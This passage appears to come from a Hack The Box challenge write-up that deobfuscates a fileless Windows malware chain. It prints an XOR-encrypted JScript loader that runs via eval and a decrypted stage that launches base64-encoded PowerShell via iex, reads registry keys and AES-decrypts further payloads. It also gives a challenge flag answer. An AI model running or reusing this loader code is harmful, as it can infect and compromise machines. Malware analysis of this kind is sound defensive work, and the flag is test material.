Hx86J="1b7109061e2a631c0604033112492836062e724b22243828550434070a13352a1a21260224793d46067429133b24772753602c7713114f2910306315144101345e4174133d3b3619442e353f130e0f305927283f1215761e191f72530f353d3f067d0d7616096534710d197c3e4b117352301b5f3c041859582c141c532d712f3f3601455a3d031011011642043a1b3633771c201f0352202b2b6005204466202502392c572a365d7b0444291b3d151f3e3f325129250312162a7c32223d242758732e664f05412778771a2d0b182823231a200e0b1f2b2844093d2f5f4b0c73033c2c245109081a321b22272422042b004b5e0713734005040d1226073d667e1f113612093c340c600d59455359746b42665b5748763d1412243514352267414d02437f27340d5d742935335338273102152a312b31280c5716594a353a273506271f4932252a1d0d6f664a491e3c49521c2f2a022e4701272a352a07516615190c2c0c172060401d4a53041b13352f4d7e56450828375149161b14193961340f5105201d295233737d111730300d6b2c063b3a10212b07534a2a2b0d0732221d23365d5b0b3d1e0c0f2e02047b7b221540032a136f123978096527402b2827385600333c02373c0634080c0f052e1d39151d0636787f25360b3a28362923120d025c0b180959377a1129252b2b71102329390d236a280b06154839210e2b0e01241301393e38173204283d3614213c357b04083723600c010a3e0f200e2b0c0510370f3c20350f672b05320b282a241512132d183a2127263a213a323a2627264a100d1d305a27273427222b0a3c23382a2825330a2c3c072c02221b1e2a0a16341b2c353e24283508762b520c283a2255050d1a344d0811342a222b0a332333107f0f3c203b0f6c11400e3120230b380e0c2d53787f10182e3c3b512503205067040837234c0c3024230e09162a0928073a0d2327040b5a3801221b1e2a25026607050f1c213a32263a120a1b382526742e1e27205a397b09191d2b3320083f2638225527283a73240830362c3c090623093e512527120d7d373c252e3f3d2256090e0d2c45213015210919492f1c3f263a3f3c1129306c301d271b3b030a0567003e35083a2b521b3f2b253e2414357f530e33024d222715201e370a2f240136762323163a25590a0132261a2f1d1512522d2608373d0c073f2b2539221536070020332b430c20053f09201e2f2401223f0c1d0170277053133d51053e2328011f2b0d032328521b3610391f7a3d0a7c13212c05050c7b23291d2b3b2b20385606303c1d2d38631a1f0a51233423283f1f3f3522792052072328391f233a22561e1e30125b251d343b2137347d0f233a7f250f1d340b6c20400c253f0d1e3719042c27391b1439037f2b367d3a2726645e203772730c2409261e3415311f5a5379260805173b5e05043a503f7416013b5b3d3900203b2622383a3226783b260658142233610b1109601e24493114060f7f38566a370d5934080c253f3d1f3b385d3126741b1529073f130c2e203b2955100f20334c34111561271e4d230f2c577d2508192e0a731a1931503c2b0d1667052b222e213a397d782b0f1b3a2852601a264673520d332c3f0e344d3c0928317b26273f752373114238350d340e2c051e2a35392213520723283603203a2260030a2705450c20063b25091a31102329390a23053b0d7c09010d1b3b7509056700061b2e3a250c0b3b2b323e263e187b180e330e04213015640909482b083822240d300a7508633b1e222a0e700e2c660704320c241425003f1452072315296413261d065a250e23270d302b310838223b3d0915363367231a31083c340b0605022932217617361739120c1b27285355050e33734c270e2b250d302b360b125607333c01160d632803323a050b1e38660704182a3f3a393e24150b2a76121b590d0f371540231a34391c3030360f2c5736223712290c7005460935302b0d270e5f2b0a3523130c297f10220c3b2b52630d09372b020d241160202b33310c28317d262c627b0a5934410c3a23310e2c1e020135392215367825152621391308701f0b2c334237110d38262011261c050f7f3332272631673004251b022f1e150652330c1b7c3d347426100c1b251522703e212c0905341e772517264131113c353b0b5719773c07300832352f300c2c051e2a183a383d221f3a3c1878022b360704203320452130153a0a27480b1f33003b3d56193333632c4121272371232801093f322a353c0826783b292a36213260000a377266341e013b0f302b2e0b381438252701282767573c32355c2a2328301b285321223a221f7b3c080c3b130c670d0e330a0422223f3c261e1d7424280f78333c3b320d7c521a31083c7d130201582b347426100c1b2515220f1b14397c5a1e2377403b7b113a202b33342123083a385719770a7c30073251232c24283f5e2b0d0722281b047b3e35250a2b39781a201911760b11153c270a1e2f273f223c23231e732260111a31080a7d0d281e5a2b0a29231524077a15261b353a257f130f20345e0a232c690e343075090007230d2119770d73340b23262c760c3b240006251876250c1b7c3d347426100c640020370561341e0961271e15742038560b0a0a3f350d735b1f0b0f2f3326273c1e36361b3525360b3a283629232b2541011e200a0c240e20610818373d1f3c257f3331012e300728440b2a3b32240630003e0b2e3c3b29147a3a353e24151b675310191106221c7e39251e2f2e212821053d1d660c336353070b0c051023271d073e367d783b29087c213478231518033a1d193759377a16371140153e212c353b25081d2e30073408093a3b710b04191202390f7f1353293628390f201432072e271a2b420a0e7e04203b33281c3c532023231e722577301d251b1126125c3b1103261b3b3d0d032328521b361039605f081f094c0b11056026411d3d1c3321200c3766060a5a0e060c25501023271d073e367c0113531f2329352279240c64021e372c02240102630818373226230f1a0b1d34290d4e3701271b3b77093c623a0552033f15262139130b7d383e18605f0a20767a34112424104133351f3c2d7f20213f1225582c410b0f3f2c25391d073e361f2312082a24151b183f3e18605b0b20775e0b1d1225111e2f2c1f2d31393b33662922770946222a02750b04051b04520f39125318203a353e241235511f16332b4f0d0e7e2a1e201e340a12317c27376607086c2c060a5127280c2c3c5c2d26007f3d0a1f3f12520f39125367050f20334c34111561271e4d230f23367a0f3020290b6023480b1802230c2c30042e0f3e3617393e3817393e7b1739415b222c344f08113428222b0a712333107d0f3c20720f6c11420e3120301d06160536182e3c3b520b051353033c28397c101e2c094d3d1e7f3e08301d0d1612003c2356062c25770608320f2f2e0d16200504082e3c3b5318213d2229233b1845041220374d3d1e7e2a2641237421592621252737080b5a331f233102311204013a05260b2523322a20265103062837780e0920024f2578331417343f171d3f0035225527063a73242230362c3c0a3c3c183050037f120c213a2b507c2d20515a021118770023202c200d301e2d201121760c1e1d7b0c4e34480d182f7d22151d52021b2976141b1f76141b1776141b5a530d1d0641342024621d413c3d0f121421330e092f275d010222183876093811063e0b2a213d222e7f2b2529253b1845041d46164d372024230e091a2a09280038301d3031234e281a31310a370d1534133d082e3f3e181f213c350876130b590d0e33244d213015210a273c7d2701082823233c73264d304425182c7d25053c0c2d2926353e181f3f3c257d263b2651120923060324012c2a092030730f2c003639333f3b0b67231e210c1a332137241201393e7f17393e3517393e371739415b22270e413420233f203b2b3326110c3925563f2f30065b04221b1e2a0b5d3c052b22292210322e3c3b537c233b1845041e0d735b220a23270e0a1273243c3a20253366340d77231e3c0f3f770b3a6e02060c1b2515220f1b1439037f2b36021f12332f4c341e013b25244c2a0900527e0d2305762277301c3135113e1d3c2000350b043f3a3278172836217f255307060f3002452511333c21341574233f173f330d3429085e2b1624352f311d2c1600350b043f1453213613320c3b2739781a0d370d5a0a01152727091632095925380837667233631a1d3251232c253c621d040c2e39280c747f3b222a241035731a084709590c24151e1e2b373e1c3c072339561d2d306c30170935387d0d2c3000060b18373a32177f2b39257f2132602d091d06022130063b1e244c760a002d1f3d3211143f7134223c092f0a153c15123d360339130c782328521f232b22770d0d1a76590c01093c210a2b030801522d335705323372524727095c28235f335a06361c203a327821153621243e507c062037767f0a0e1124113b3332262c35360d2c38252277051e210c1a3c2137241101393e7f17393e3817393e3617327b1e1e1d23432430303e17360d001338003c2356663633635741221b1e2a0804332c3e34290828341b3a3b183a21150c5e130e0d2c4522250d16273401061c59362023543705306701023f53277424023b2435507c2d2851250d120d7d7a3c08591a0d377640371e763c0d301e2d201121760c1e157b205d531c22520a2a0b2c333d34341c213a320c3b150c0b3c1536670d0e311e4c217b2b29262038301333293f2027192d0d7c30060b1806320b5d111c0632787f2b3635232b5207271332071c2719244337247e600e301e2f243f223f25571d2e0b59303f323a273e1e3833073753032028391f2910361c763b225501251e124d251a1d601e2b117415383108240d1275264d231a32355c760804193b33370f1927241b1c250a0b012332701f1e2c2452377b7e25261e2f2e212c0f390b0d1625205a52460935302b0d2838122e227c3f1253783915220f2d1036075a1c272b02240e282914273b7d0a58072008332b2e227027010d1b01342402670c2b371b3610320c2610291f7f12297f5c080d7e5d0d0e2c2520342f371f3c0736303363370b07281f24502332232c06042d2626383a3274212b391f19122660022033114f27202c25271e2f3e213c1b7f0f27057508633b1e2225063d0e2c661803220c242918787e12261f271526640c252316450b3015210919492f1d12567e0a23012a0d733417093538730d2702592b221f363f257d242918783b2b397c101d2323592227153c213b282309332d380b233f7220772b46271b207326380e042c221f7e3f080c3b1326213d2b3273011e0e0e45270a7626271a382b0f23367d202762310863161d21213b2825010e5d3651740124271b1a233707002034032c0f2706410c7a0e370f302b750b02223b0b233f303367231a3a0820340e2c661d04080c203b29187d38227c3c103646060d370d5d0c0e30390f2015730f232a383937022d237c2b410e250528222c3c12370814371724747e15227c1b1529781a261924020f1e1e3f0d1a3023093c35372027013b24770e46222a2033173c3002021b0b76141b0f76141b07763808731e1e1d065b0c2024230e422b2c265910283b236b2c2577061d21312c2a0c37670003352a763c25397c1026213c2b32550120202052221e3f600d302b3d082856023333662c0d7305010d1b3b3d0a3b67112835267a3e5321223a222a24120b77180e3c1201251a763e2030382f2601223a3d2305373307301e233a1a2f240512522d2904383d0a3523130c297f102267100b202c00081e2b29262038301333293f2027192d0d7c30060b1806320b5d111c0632787f2b3635232b5207271332071c2719244337247e600e301e2f243f223f25571d2e0b59303f323a273e1e3833073753032028391f2910361c763b225501251e124d251a1d601e2b117415383108240d12742077331e222451312538011104530b212b32783b2b390335283656061c462b5e251e05250e301e2f2601223a3c57052b0a07300809355c2a0c2c055a28223a24120b083f3a320c263e18605b0b37340c24010e28222b487d1059357f25313f72336353200b0f50331d371d5b02320c203a222a26141b0f76141b7c53210e010c0b330d6921092b7d0c02223b330d370b3a042c27270c3316150634182d511709130f173f12082e3c3b530b1f2623125b220a236211201a370f59567f231d3832255a281d3d271106165d02042d52171d23082e3c2650031a240c5e1f164576573f7b2f12271f49710802083f202762373063531d21210e2d22151552021b0b7638087c22382229193b1845042733155d0a0e123e0f2038302106253c0d33062523730d080e3a597960467e42455a3b3c3e5529722212757c5f3347046c56040f321510392a17163336373f1c1017040d3e02562d3435002a23002018370e3a2a0332252a1d0d111307501c5a1828375a192c35232c1615286b0e1b2a490d363a4910071f1e58053d3d1e3f494b51617e585a302c10152e2759041b1139172b5a1d2c6f797f";
KXLThQx1eIEsgIxNgwK="YTA88niSJLrPqLRUZCKqgETbyiLCOPZJSvgrdh";
BKuhfIMaVHImUOt9FreZ6I="s0c2lY2yYE5Ul8b3hDBuPh6pUWwP96Gud5OETJurjWho";
XeFMutnVMmJxSjDGPQ6UWW="nQdtB3Q3HMdUmrMfjYdw8Ck7ZnfMqpnmO9RuB6VRWruZ4m";
GL1F5ur="";
for(lEiDM7Bf=0;
lEiDM7Bf<Hx86J.length;
lEiDM7Bf+=2)GL1F5ur+=String.fromCharCode(parseInt(Hx86J.substr(lEiDM7Bf,2),16));
GFyZLq2IlwZiswVshlQO="8i0Bs6RorAfSKHGazGdiSO0E";
YNDfeZ7nhCFgDsnyuf6T="bq2xDTgFixeZHlssFrQLJ0KFbFQ6YwSMWI6pP6nFCKzg";
thqEpeLEVHKEdDqA6gJPO="yvkbsKcYP2MQ9BmjY6ovcSQu7BPxFMOLofM1rLOH5eWS3fq";
hdsbBW6vslEvfTgMZWAHw="usx65VNEaY6RscalJfMNqzf2ta51fK0S8Z";
AOJxskajyajHlX8rrJwVjj="cH96okEBlOVbxbG9hynsBO";
IzyFobDle1EfTbt0UaYR="NHH9vegXsxSIPYCixW9r2oAdqNUv";
jiK=new ActiveXObject("WScript.Shell");
hhfHSU7sHS="lIAsjZQE0o";
lIAsjZQE0o=jiK.RegRead("HKCU\\software\\Classes\\AppXoiy6rzzu62tdihr9rgvofad4hz7tpf4m\\Shell\\open\\onYj");
KDprMaI6LqDP="";
for(dmcVPZEPsN0pkc=tVmtxai7BNjr8pYvV=0;
tVmtxai7BNjr8pYvV<GL1F5ur.length;
tVmtxai7BNjr8pYvV++){KDprMaI6LqDP+=String.fromCharCode(GL1F5ur.substr(tVmtxai7BNjr8pYvV,1).charCodeAt()^lIAsjZQE0o.substr(dmcVPZEPsN0pkc,1).charCodeAt());
dmcVPZEPsN0pkc=(dmcVPZEPsN0pkc<lIAsjZQE0o.length-1)?dmcVPZEPsN0pkc+1:0;
}VMCDaITzJEuxUzFfqW6CxmIv="RmzkSvCuNtQSvirqhosFwNevflt";
g5CaYPcfMLBQAI4YxnKM="Ly4CoYRzm1dqgsT8Nith7ObPUA";
RIAF5BwTKhPpCYMZmlOSH="9PXgGoNIsZgAAtv9KPbPl9qsEaUIq8eAKD0";
ZllGThtipbS6AcFiANdtp9zPY="nuRBVGbAcB6OdhZEnSFGDHhg2TC8ZPACb7wc94fpDm0QN";
oE4JKDACuNkqdZxpDsNfzDL="OR0QfvvwO9U33UCusmZStnP98k4rZ";
eval(KDprMaI6LqDP);
UheieKveLxiExaFZ2u7yrR="OMesq8pJZjHUSlFjUQXUEcygMg9aYzpmy0";
amYEf1UDURGnOld8XVmet="g8v0M2CoTITjcUeZijB0ULjDHMEmPxb";
rJlMSwPfGIHOqoqse5SYF="ki01xcJlzvVvKaZB5DmilXTLkdhQTt";
// 
cRkDgAkkUElXsDMMNfwvB3="CbO8GOb9qJiK3txOD4I31x553g"; // FLAG
//
fKofUDgNWdzm6nK5sAD="k2wtzKHWBB9o5DJjDYUJkgwCaV2Yr";
MPgXgpbcfPwwn4hJJzMsmHG="b4APzFzCv6FZ8rwNR";
W05PzuKnofjNtIxYgKN="yaM1OoY576346cqEBmJSKvZwuZGHuXQaK7JY2Ullt5eOrE";
HhxvXLzOLLi0mIBmJ8Dk="notepad.exe";
{% endhighlight %}

{% include htb_flag.html id="4" description="What is the value of the variable named cRkDgAkkUElXsDMMNfwvB3 that you get after decoding the first payload?" flag="CbO8GOb9qJiK3txOD4I31x553g" %}

### [5/10] What algorithm/encryption scheme is used in the final payload?

We continue down the road of deobfuscation, and remove some of the unused variables - and cleaning it up again (and again, replacing variables that reads from registry, with the values).

{% highlight js %}
Hx86J="1b7109061e2a631c0604033112492836062e724b22243828550434070a13352a1a21260224793d46067429133b24772753602c7713114f2910306315144101345e4174133d3b3619442e353f130e0f305927283f1215761e191f72530f353d3f067d0d7616096534710d197c3e4b117352301b5f3c041859582c141c532d712f3f3601455a3d031011011642043a1b3633771c201f0352202b2b6005204466202502392c572a365d7b0444291b3d151f3e3f325129250312162a7c32223d242758732e664f05412778771a2d0b182823231a200e0b1f2b2844093d2f5f4b0c73033c2c245109081a321b22272422042b004b5e0713734005040d1226073d667e1f113612093c340c600d59455359746b42665b5748763d1412243514352267414d02437f27340d5d742935335338273102152a312b31280c5716594a353a273506271f4932252a1d0d6f664a491e3c49521c2f2a022e4701272a352a07516615190c2c0c172060401d4a53041b13352f4d7e56450828375149161b14193961340f5105201d295233737d111730300d6b2c063b3a10212b07534a2a2b0d0732221d23365d5b0b3d1e0c0f2e02047b7b221540032a136f123978096527402b2827385600333c02373c0634080c0f052e1d39151d0636787f25360b3a28362923120d025c0b180959377a1129252b2b71102329390d236a280b06154839210e2b0e01241301393e38173204283d3614213c357b04083723600c010a3e0f200e2b0c0510370f3c20350f672b05320b282a241512132d183a2127263a213a323a2627264a100d1d305a27273427222b0a3c23382a2825330a2c3c072c02221b1e2a0a16341b2c353e24283508762b520c283a2255050d1a344d0811342a222b0a332333107f0f3c203b0f6c11400e3120230b380e0c2d53787f10182e3c3b512503205067040837234c0c3024230e09162a0928073a0d2327040b5a3801221b1e2a25026607050f1c213a32263a120a1b382526742e1e27205a397b09191d2b3320083f2638225527283a73240830362c3c090623093e512527120d7d373c252e3f3d2256090e0d2c45213015210919492f1c3f263a3f3c1129306c301d271b3b030a0567003e35083a2b521b3f2b253e2414357f530e33024d222715201e370a2f240136762323163a25590a0132261a2f1d1512522d2608373d0c073f2b2539221536070020332b430c20053f09201e2f2401223f0c1d0170277053133d51053e2328011f2b0d032328521b3610391f7a3d0a7c13212c05050c7b23291d2b3b2b20385606303c1d2d38631a1f0a51233423283f1f3f3522792052072328391f233a22561e1e30125b251d343b2137347d0f233a7f250f1d340b6c20400c253f0d1e3719042c27391b1439037f2b367d3a2726645e203772730c2409261e3415311f5a5379260805173b5e05043a503f7416013b5b3d3900203b2622383a3226783b260658142233610b1109601e24493114060f7f38566a370d5934080c253f3d1f3b385d3126741b1529073f130c2e203b2955100f20334c34111561271e4d230f2c577d2508192e0a731a1931503c2b0d1667052b222e213a397d782b0f1b3a2852601a264673520d332c3f0e344d3c0928317b26273f752373114238350d340e2c051e2a35392213520723283603203a2260030a2705450c20063b25091a31102329390a23053b0d7c09010d1b3b7509056700061b2e3a250c0b3b2b323e263e187b180e330e04213015640909482b083822240d300a7508633b1e222a0e700e2c660704320c241425003f1452072315296413261d065a250e23270d302b310838223b3d0915363367231a31083c340b0605022932217617361739120c1b27285355050e33734c270e2b250d302b360b125607333c01160d632803323a050b1e38660704182a3f3a393e24150b2a76121b590d0f371540231a34391c3030360f2c5736223712290c7005460935302b0d270e5f2b0a3523130c297f10220c3b2b52630d09372b020d241160202b33310c28317d262c627b0a5934410c3a23310e2c1e020135392215367825152621391308701f0b2c334237110d38262011261c050f7f3332272631673004251b022f1e150652330c1b7c3d347426100c1b251522703e212c0905341e772517264131113c353b0b5719773c07300832352f300c2c051e2a183a383d221f3a3c1878022b360704203320452130153a0a27480b1f33003b3d56193333632c4121272371232801093f322a353c0826783b292a36213260000a377266341e013b0f302b2e0b381438252701282767573c32355c2a2328301b285321223a221f7b3c080c3b130c670d0e330a0422223f3c261e1d7424280f78333c3b320d7c521a31083c7d130201582b347426100c1b2515220f1b14397c5a1e2377403b7b113a202b33342123083a385719770a7c30073251232c24283f5e2b0d0722281b047b3e35250a2b39781a201911760b11153c270a1e2f273f223c23231e732260111a31080a7d0d281e5a2b0a29231524077a15261b353a257f130f20345e0a232c690e343075090007230d2119770d73340b23262c760c3b240006251876250c1b7c3d347426100c640020370561341e0961271e15742038560b0a0a3f350d735b1f0b0f2f3326273c1e36361b3525360b3a283629232b2541011e200a0c240e20610818373d1f3c257f3331012e300728440b2a3b32240630003e0b2e3c3b29147a3a353e24151b675310191106221c7e39251e2f2e212821053d1d660c336353070b0c051023271d073e367d783b29087c213478231518033a1d193759377a16371140153e212c353b25081d2e30073408093a3b710b04191202390f7f1353293628390f201432072e271a2b420a0e7e04203b33281c3c532023231e722577301d251b1126125c3b1103261b3b3d0d032328521b361039605f081f094c0b11056026411d3d1c3321200c3766060a5a0e060c25501023271d073e367c0113531f2329352279240c64021e372c02240102630818373226230f1a0b1d34290d4e3701271b3b77093c623a0552033f15262139130b7d383e18605f0a20767a34112424104133351f3c2d7f20213f1225582c410b0f3f2c25391d073e361f2312082a24151b183f3e18605b0b20775e0b1d1225111e2f2c1f2d31393b33662922770946222a02750b04051b04520f39125318203a353e241235511f16332b4f0d0e7e2a1e201e340a12317c27376607086c2c060a5127280c2c3c5c2d26007f3d0a1f3f12520f39125367050f20334c34111561271e4d230f23367a0f3020290b6023480b1802230c2c30042e0f3e3617393e3817393e7b1739415b222c344f08113428222b0a712333107d0f3c20720f6c11420e3120301d06160536182e3c3b520b051353033c28397c101e2c094d3d1e7f3e08301d0d1612003c2356062c25770608320f2f2e0d16200504082e3c3b5318213d2229233b1845041220374d3d1e7e2a2641237421592621252737080b5a331f233102311204013a05260b2523322a20265103062837780e0920024f2578331417343f171d3f0035225527063a73242230362c3c0a3c3c183050037f120c213a2b507c2d20515a021118770023202c200d301e2d201121760c1e1d7b0c4e34480d182f7d22151d52021b2976141b1f76141b1776141b5a530d1d0641342024621d413c3d0f121421330e092f275d010222183876093811063e0b2a213d222e7f2b2529253b1845041d46164d372024230e091a2a09280038301d3031234e281a31310a370d1534133d082e3f3e181f213c350876130b590d0e33244d213015210a273c7d2701082823233c73264d304425182c7d25053c0c2d2926353e181f3f3c257d263b2651120923060324012c2a092030730f2c003639333f3b0b67231e210c1a332137241201393e7f17393e3517393e371739415b22270e413420233f203b2b3326110c3925563f2f30065b04221b1e2a0b5d3c052b22292210322e3c3b537c233b1845041e0d735b220a23270e0a1273243c3a20253366340d77231e3c0f3f770b3a6e02060c1b2515220f1b1439037f2b36021f12332f4c341e013b25244c2a0900527e0d2305762277301c3135113e1d3c2000350b043f3a3278172836217f255307060f3002452511333c21341574233f173f330d3429085e2b1624352f311d2c1600350b043f1453213613320c3b2739781a0d370d5a0a01152727091632095925380837667233631a1d3251232c253c621d040c2e39280c747f3b222a241035731a084709590c24151e1e2b373e1c3c072339561d2d306c30170935387d0d2c3000060b18373a32177f2b39257f2132602d091d06022130063b1e244c760a002d1f3d3211143f7134223c092f0a153c15123d360339130c782328521f232b22770d0d1a76590c01093c210a2b030801522d335705323372524727095c28235f335a06361c203a327821153621243e507c062037767f0a0e1124113b3332262c35360d2c38252277051e210c1a3c2137241101393e7f17393e3817393e3617327b1e1e1d23432430303e17360d001338003c2356663633635741221b1e2a0804332c3e34290828341b3a3b183a21150c5e130e0d2c4522250d16273401061c59362023543705306701023f53277424023b2435507c2d2851250d120d7d7a3c08591a0d377640371e763c0d301e2d201121760c1e157b205d531c22520a2a0b2c333d34341c213a320c3b150c0b3c1536670d0e311e4c217b2b29262038301333293f2027192d0d7c30060b1806320b5d111c0632787f2b3635232b5207271332071c2719244337247e600e301e2f243f223f25571d2e0b59303f323a273e1e3833073753032028391f2910361c763b225501251e124d251a1d601e2b117415383108240d1275264d231a32355c760804193b33370f1927241b1c250a0b012332701f1e2c2452377b7e25261e2f2e212c0f390b0d1625205a52460935302b0d2838122e227c3f1253783915220f2d1036075a1c272b02240e282914273b7d0a58072008332b2e227027010d1b01342402670c2b371b3610320c2610291f7f12297f5c080d7e5d0d0e2c2520342f371f3c0736303363370b07281f24502332232c06042d2626383a3274212b391f19122660022033114f27202c25271e2f3e213c1b7f0f27057508633b1e2225063d0e2c661803220c242918787e12261f271526640c252316450b3015210919492f1d12567e0a23012a0d733417093538730d2702592b221f363f257d242918783b2b397c101d2323592227153c213b282309332d380b233f7220772b46271b207326380e042c221f7e3f080c3b1326213d2b3273011e0e0e45270a7626271a382b0f23367d202762310863161d21213b2825010e5d3651740124271b1a233707002034032c0f2706410c7a0e370f302b750b02223b0b233f303367231a3a0820340e2c661d04080c203b29187d38227c3c103646060d370d5d0c0e30390f2015730f232a383937022d237c2b410e250528222c3c12370814371724747e15227c1b1529781a261924020f1e1e3f0d1a3023093c35372027013b24770e46222a2033173c3002021b0b76141b0f76141b07763808731e1e1d065b0c2024230e422b2c265910283b236b2c2577061d21312c2a0c37670003352a763c25397c1026213c2b32550120202052221e3f600d302b3d082856023333662c0d7305010d1b3b3d0a3b67112835267a3e5321223a222a24120b77180e3c1201251a763e2030382f2601223a3d2305373307301e233a1a2f240512522d2904383d0a3523130c297f102267100b202c00081e2b29262038301333293f2027192d0d7c30060b1806320b5d111c0632787f2b3635232b5207271332071c2719244337247e600e301e2f243f223f25571d2e0b59303f323a273e1e3833073753032028391f2910361c763b225501251e124d251a1d601e2b117415383108240d12742077331e222451312538011104530b212b32783b2b390335283656061c462b5e251e05250e301e2f2601223a3c57052b0a07300809355c2a0c2c055a28223a24120b083f3a320c263e18605b0b37340c24010e28222b487d1059357f25313f72336353200b0f50331d371d5b02320c203a222a26141b0f76141b7c53210e010c0b330d6921092b7d0c02223b330d370b3a042c27270c3316150634182d511709130f173f12082e3c3b530b1f2623125b220a236211201a370f59567f231d3832255a281d3d271106165d02042d52171d23082e3c2650031a240c5e1f164576573f7b2f12271f49710802083f202762373063531d21210e2d22151552021b0b7638087c22382229193b1845042733155d0a0e123e0f2038302106253c0d33062523730d080e3a597960467e42455a3b3c3e5529722212757c5f3347046c56040f321510392a17163336373f1c1017040d3e02562d3435002a23002018370e3a2a0332252a1d0d111307501c5a1828375a192c35232c1615286b0e1b2a490d363a4910071f1e58053d3d1e3f494b51617e585a302c10152e2759041b1139172b5a1d2c6f797f";
GL1F5ur="";
for(lEiDM7Bf=0;
lEiDM7Bf<Hx86J.length;
lEiDM7Bf+=2)
GL1F5ur+=String.fromCharCode(parseInt(Hx86J.substr(lEiDM7Bf,2),16));
lIAsjZQE0o="a2jDtG5nIGPDsyDEkcOidSBi4bqhbiDGoWkgaMOqaMOqaMOq"
KDprMaI6LqDP="";
for(dmcVPZEPsN0pkc=tVmtxai7BNjr8pYvV=0;
tVmtxai7BNjr8pYvV<GL1F5ur.length;
tVmtxai7BNjr8pYvV++){KDprMaI6LqDP+=String.fromCharCode(GL1F5ur.substr(tVmtxai7BNjr8pYvV,1).charCodeAt()^lIAsjZQE0o.substr(dmcVPZEPsN0pkc,1).charCodeAt());
dmcVPZEPsN0pkc=(dmcVPZEPsN0pkc<lIAsjZQE0o.length-1)?dmcVPZEPsN0pkc+1:0;
}
console.log(KDprMaI6LqDP);
{% endhighlight %}

This presents us with some PowerShell code:

{% highlight powershell %}
zCcBjmVrOCSua0lsmM="FwzAafEohzqmuvMeE4r7g9fbZi8V2RF3gVzGYw3Qg8Eq5";
zYhtppLDWqgKw6pCXsX9oxR="nxrNgOg2bNPZ8JI8M2U69ST6XWZ0lNet1D5hPaj";
pLapLY3ewTGREvdkDgNbl0AS="eNavE3yt4Of5AyTQXQhY6HhLcwg3CCpkV9AD";
BtI10JixalfHyogoLiApkLG="H4lkGC0DGkSVmVEoKZay4Cg4ukMJBbtD";
try{moveTo(-100,-100);
resizeTo(0,0);
Ss83=new ActiveXObject("WScript.Shell");
(Ss83.Environment("Process"))("lyzqh")="iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2w9QCgoInsxfXswfSIgLWYnMTInLCdUbHMnKSwoInsxfXswfSItZiAnczExJywnVGwnKSwiVGxzIiwoInswfXsxfSIgLWYnU3NsJywnMycpKTskYTE9Z3AgKCgoInsxfXszfXswfXs0fXsyfXs1fSIgLWYgJ250aycsJ0hLQ1UnLCdybycsJzonLCdudGtFbnZpJywnbm1lbnQnKSkuckVwTGFDZSgoW2NIYXJdMTEwK1tjSGFyXTExNitbY0hhcl0xMDcpLCdcJykpOyRqMj0kYTEuVXBkYXRlOyRGMj0kYTEuZ3VpZDskeTM9JGExLnRpZDskajU9JGExLmhpZDskZzE9JGExLmJpZDtmdW5jdGlvbiBoMSgkajApeyR2ND1bU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxnb3JpdGhtXTo6Q3JlYXRlKCdtZDUnKTskeDM9JHY0LkNvbXB1dGVIYXNoKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGowKSk7JG42PVtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHgzKTtyZXR1cm4gJG42LlJlcGxhY2UoJy0nLCcnKX07ZnVuY3Rpb24gczkoJG4xLCR4OCl7JGs3PWdpICRuMTtmb3JlYWNoKCRiNSBpbiAkazcuUHJvcGVydHkpeyR1Nj0kazcuTmFtZSsiOyIrJGI1OyR4Mz1oMSAkdTY7aWYoJHg4IC1lcSAkeDMpe3JldHVybiAoKGdwICRuMSAtTmFtZSAkYjUpLiRiNSl9fWZvcmVhY2goJG4yIGluICRrNy5HZXRTdWJrZXlOYW1lcygpKXskdjg9czkgKCRuMSsiXCIrJG4yKSAkeDg7aWYoJHY4Lkxlbmd0aCAtZ3QgMCl7cmV0dXJuICR2OH19cmV0dXJuICIifTtmdW5jdGlvbiBuOXtwYXJhbShbYnl0ZVtdXSRuMykkYzQ9TmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtKCRuMywwLCRuMy5MZW5ndGgpOyRjNT1OZXctT2JqZWN0IEJ5dGVbXSgzMik7JHgyPSRjNC5SZWFkKCRjNSwwLCRjNS5MZW5ndGgpO2lmKCR4MiAtbmUgJGM1Lkxlbmd0aCl7ZXhpdH0kYjU9TmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJmYzI4OThEZXJpdmVCeXRlcygkbTAsJGM1KTskYjc9JGI1LkdldEJ5dGVzKDMyKTskdjk9JGI1LkdldEJ5dGVzKDE2KTskaDU9TmV3LU9iamVjdCBTZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzTWFuYWdlZDskZTM9JGg1LkNyZWF0ZURlY3J5cHRvcigkYjcsJHY5KTskdzU9TmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW07JHE3PU5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW0oJGM0LCRlMyxbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW1Nb2RlXTo6UmVhZCk7JHE3LkNvcHlUbygkdzUpOyR3NS5Qb3NpdGlvbj0wOyR5NT1OZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkdzUpOyR1OT0keTUuUmVhZFRvRW5kKCk7JHk1LkRpc3Bvc2UoKTskcTcuRGlzcG9zZSgpOyR3NS5EaXNwb3NlKCk7JGM0LkRpc3Bvc2UoKTtyZXR1cm4gJHU5fTskbTA9czkgKCgoInsyfXswfXs4fXs1fXszfXsxfXs5fXs2fXs0fXs3fSItZiAnQycsJ3FJb2NsYXNzZXNxSW8nLCdISycsJ2UnLCdyZmFjJywncicsJ2UnLCdlJywnVTpxSW9zb2Z0d2EnLCdJbnQnKSkuUkVQbGFjRSgoW0NIYVJdMTEzK1tDSGFSXTczK1tDSGFSXTExMSksW1N0cmluZ11bQ0hhUl05MikpICgiezB9ezN9ezV9ezF9ezJ9ezd9ezR9ezZ9ezh9IiAtZic2Y2EyJywnZjZmNicsJzQ2NWFmYjgnLCc0ZDdjJywnY2QxYicsJzcnLCcwYycsJzJkYScsJzcxZicpOyRnMTE9bjkgJGcxOyRqNTE9bjkgJGo1OyR5MzE9bjkgJHkzOyRpMD0iJGcxMWA6JHkzMSI7JGcy